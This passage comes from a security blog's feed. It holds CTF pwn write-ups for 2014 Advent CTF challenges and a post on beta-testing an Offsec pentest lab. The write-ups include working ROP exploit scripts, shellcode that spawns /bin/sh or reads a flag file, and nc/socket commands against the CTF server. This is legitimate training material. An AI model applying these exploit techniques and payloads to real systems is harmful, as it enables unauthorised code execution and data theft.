</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>        <span class="c"># number of bytes to read</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>      <span class="c"># dummy value</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This reads in <code>0x200</code> bytes from stdin to the start of the executable section of the binary. Finally, the ROP chain returns to the start of that buffer, which hopefully contains our shellcode! Finally, make sure that the payload is indeed 125 bytes long, else this entire house of cards falls down:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># payload length must be 125, because after read, the next</span>
</span><span class='line'><span class="c"># syscall is mprotect; eax = 125</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">125</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Because I ran the executable locally via socat, I need to connect to the proper socket and send the payload. The same goes for the remote connection.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&quot;localhost&quot;,28099))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;pwnable.katsudon.org&quot;</span><span class="p">,</span><span class="mi">28099</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>After finishing the ROP chain, the binary should now be awaiting further shellcode on stdin, so I&rsquo;d better send that over quickly!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># http://www.shell-storm.org/shellcode/files/shellcode-851.php</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the shell should have been spawned, so interact with it</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The shellcode is sent over; the ROP chain will read it at <code>0x8048000</code>, return to it and execute <code>/bin/sh</code>. Then I pass the socket to a telnet client to interact with the spawned shell. This allowed me to read the flag!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>python exploit_easy.py
</span><span class='line'>pwn me:
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>easypwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>easypwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>easypwn<span class="o">)</span>
</span><span class='line'>cat /home/easypwn/flag
</span><span class='line'>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Oh My Scanf]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf/"/>
    <updated>2014-12-17T22:22:34+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf</id>
    <content type="html"><![CDATA[<p>Another month, another CTF! This Advent CTF runs almost the entire month of December. This challenge seemed easy at first, but turned out to be a bit more tricky!</p>

<!-- more -->


<p>We&rsquo;re given a vulnerable binary plus the C source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* gcc -m32 -fno-stack-protector -zexecstack -o oh_my_scanf oh_my_scanf.c */</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;name: &quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hi, %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This looks pretty straight-forward, right? <code>scanf</code>, an executable stack and a small buffer, oh my! A standard buffer overflow:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
</span><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>./oh_my_scanf
</span><span class='line'>name: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
</span><span class='line'>hi, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I checked <code>gdb</code> and <code>eip</code> was overwritten with <code>HHHH</code>, so we need 28 bytes to overflow the buffer. Next, because the stack is executable, we should be able to jump to it&hellip; but how? ALSR is enabled so we don&rsquo;t know the location of the stack. None of the registers contain a pointer to the shellcode, there aren&rsquo;t any <code>jmp esp</code> or <code>call esp</code> instructions. Bruteforcing it seemed tedious at best. We looked at writing a ROP chain, but there are very few useable gadgets.</p>

<p>Thinking long and hard together with Swappage and superkojiman, we came up with several strategies. One of the suggestions by Swappage revolved around abusing <code>scanf</code> to build shellcode somewhere. superkojiman noticed that the main code section is <code>rwx</code>!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
</span><span class='line'>Start      End        Perm    Name
</span><span class='line'>0x08048000 0x08049000 r-xp    /home/bas/adventctf/oh_my_scanf
</span><span class='line'>0x08049000 0x0804a000 r-xp    /home/bas/adventctf/oh_my_scanf
</span><span class='line'>0x0804a000 0x0804b000 rwxp    /home/bas/adventctf/oh_my_scanf
</span><span class='line'>0xf7e19000 0xf7e1a000 rwxp    mapped
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>Yes, this has to be it! We can write to a section of memory that is executable <em>and</em> at a fixed location. After writing shellcode there, we simply jump to it to have our cake <em>and</em> eat it.</p>

<p>So I modified a ROP chain that I was fiddling with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">SCANF</span> <span class="o">=</span> <span class="mh">0x80483b0a</span>
</span><span class='line'><span class="n">POPRET</span> <span class="o">=</span> <span class="mh">0x804835d</span>
</span><span class='line'><span class="n">SCANF_STRING</span> <span class="o">=</span> <span class="mh">0x80495ce</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">28</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SCANF</span><span class="p">)</span>         <span class="c"># return-to-got, scanf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRET</span><span class="p">)</span>        <span class="c"># next return address</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SCANF_STRING</span><span class="p">)</span>  <span class="c"># pointer to &quot;%s&quot;, arg1 for scanf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0804a040</span><span class="p">)</span>   <span class="c"># pointer to readable/executable</span>
</span><span class='line'>                          <span class="c"># arbitrarily chosen section of code</span>
</span><span class='line'>                          <span class="c"># it doubles as return address</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>             <span class="c"># close first scanf call</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this modified shellcode below will be read by the scanf call that results from our ROP chain.</span>
</span><span class='line'><span class="c"># we need the extra &quot;\na&quot; to flush the buffer, i think. </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x54\x59\x90\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff</span><span class="s">flag</span><span class="se">\n</span><span class="s">a&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>I used a modified version of <a href="http://www.shell-storm.org/shellcode/files/shellcode-73.php">this shellcode</a>. The shellcode wasn&rsquo;t working locally, and I narrowed it down quickly to a bad byte, <code>0x0c</code>. This was part of the <code>lea ecx, [esp]</code> instruction. I exchanged this for:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>rasm2 -
</span><span class='line'>push esp
</span><span class='line'>54
</span><span class='line'>pop ecx
</span><span class='line'>59
</span><span class='line'>nop
</span><span class='line'>90
</span></code></pre></td></tr></table></div></figure>


<p>And off we went! I verified the exploit remotely by reading <code>/etc/passwd</code> and then I guessed the name of the flag file to be <code>flag</code>. Simple, really =)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>python exploit.py <span class="p">|</span> nc pwnable.katsudon.org 32100
</span><span class='line'>name: hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAA..<span class="o">]</span>.E.@..
</span><span class='line'>ADCTF_Sc4NF_IS_PRe77Y_niCE
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>ADCTF_Sc4NF_IS_PRe77Y_niCE</code>. In the end, the executable stack turned out to be a red herring and something more unusual was going on. Cool challenge!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Don't Hate the Playground, Hate the Game]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/11/dont-hate-the-playground/"/>
    <updated>2014-12-11T19:11:06+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/11/dont-hate-the-playground</id>
    <content type="html"><![CDATA[<p>Several months ago, Peleus approached me and asked me to participate in a beta-test of an upcoming Offsec &ldquo;Playground&rdquo;. I still feel honored for being selected! Together with several others, I was given over two weeks of intensive beta-breaking :)</p>

<!-- more -->


<p>Some background about myself: I have been absorbed in the infosec field almost four years ago, starting with Over the Wire&rsquo;s wargames. Since then, I&rsquo;ve discovered the awesome <a href="https://vulnhub.com">VulnHub.com</a> and I have been addicted ever since. I have no formal background in computer science, nor have I taken <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-kali-linux/">PWK</a> or <a href="http://www.offensive-security.com/information-security-training/cracking-the-perimeter/">CTP</a> <em>yet</em>. Still, someone thought I was good enough to participate and I jumped at the chance.</p>

<p>The playground is a network, a pentest lab, built from the ground up by the Offsec crew. It contains virtual machines for us to attack and try to compromise. I was given a VPN connection to the playground. The playground itself consisted of a DMZ and several subnets. A Kali image was provided as well, which I downloaded a week into the beta-test (my mistake, should&rsquo;ve gotten it earlier). The playground offered a huge variety of machines, ranging from Linux, FreeBSD, Windows all the way to Citrix and SCADA systems. Each machine had a unique entrypoint. Some machines could only be compromised by first rooting another box. This was very nice and gave the playground an interconnected feel. Other boxes allowed pivoting into one of the other subnets. In total, there were more than fourty! boxes available.</p>

<p>The difficulty ranged from super-easy, google-click-root to mind-bendingly hard. I managed to pop ten boxes, which put me at the lower end of the spectrum. Nevertheless, I can say I&rsquo;ve learned a ton from this experience. I can now see why Offensive Security&rsquo;s slogan is &ldquo;Try Harder&rdquo; ;)</p>

<p>I think this experience has made a couple of things clear. First, I <em>really</em> need to do PWK. Second, there&rsquo;s always more to learn and more boxes to hack! Overall, I&rsquo;d say if you have the opportunity, definitely try your hand at the Playground: you will not be disappointed!</p>

<p>Finally, I&rsquo;d like to give a shout-out to Peleus for recruiting me and g0tmi1k, muts and the rest of the offsec crew for accepting me as a beta-tester. Last, but not least, thanks to my fellow beta-testers for sharing the pain and joy of attacking the playground! It has been an awesome learning experience, thank you!</p>

<p>&ldquo;<strong>Be not afraid of growing slowly, be afraid only of standing still.</strong>&rdquo; &ndash;random Chinese Proverb that I find appropriate ;)</p>
]]></content>
  </entry>
  
</feed>
